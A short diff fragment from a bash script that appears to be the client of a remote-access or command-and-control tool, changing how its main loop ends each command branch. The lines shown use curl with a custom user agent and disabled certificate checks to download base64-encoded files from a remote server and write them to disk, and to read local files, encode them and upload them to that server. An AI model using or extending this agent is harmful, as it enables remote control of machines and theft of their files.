@@ -70,7 +70,7 @@ while true; do
          file_request=$(curl -A "$cagent" -s -k -X GET "$server/api/v1/Client/Download")
          file_content=$(echo "$file_request" | grep "File: " | cut -d ' ' -f2)
          R64Decoder -t "$file_content" > "$file_path"
-         continue
+         unset invoke64 ; unset commandx
       fi
 
       if [[ $invoke64 == download* ]]; then
@@ -78,7 +78,7 @@ while true; do
          file_path=$(echo $file_path | cut -d "!" -f 1)
          file_content=$(R64Encoder -f "$file_path")
          download=$(curl -A "$cagent" -s -k -X POST "$server/api/v1/Client/Upload" -d "File: $file_content")
-         continue
+         unset invoke64 ; unset commandx
       fi
 
       if [[ $invoke64 == cd* ]]; then
